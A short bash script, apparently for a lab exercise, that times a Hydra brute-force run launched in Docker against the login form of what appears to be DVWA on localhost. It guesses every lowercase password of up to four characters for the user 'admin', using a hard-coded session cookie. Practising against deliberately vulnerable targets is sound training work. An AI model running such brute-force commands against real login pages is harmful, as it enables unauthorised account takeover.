#!/bin/bash

# Get the start time in UTC+0
start_time=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

# Run the docker command
docker run --network="host" vanhauser/hydra -V -f -I -l admin -x 1:4:a "http-get-form://localhost/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=3t56ju6q87d1f4l5v126iq50d0; security=low:F=Username and/or password incorrect."

# Get the end time in UTC+0
end_time=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

# Print the start and end times in UTC+0
echo "Start Time (UTC+0): $start_time"
echo "End Time (UTC+0): $end_time"